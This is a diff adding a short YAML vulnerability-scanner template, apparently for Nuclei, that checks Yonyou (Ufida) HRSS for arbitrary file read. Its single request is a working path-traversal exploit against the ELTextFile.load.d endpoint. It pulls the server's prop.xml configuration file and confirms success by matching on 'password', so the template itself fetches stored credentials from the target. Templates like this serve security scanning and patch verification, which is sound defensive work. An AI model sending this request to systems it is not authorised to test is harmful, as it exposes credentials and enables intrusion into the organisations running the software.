@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-hrss-eltextfileloadd-anyfile-read
+info:
+  name: "用友Ufida 任意文件读取"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友Ufida
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<enableHotDeploy>"
+      - type: word
+        words:
+          - "password"
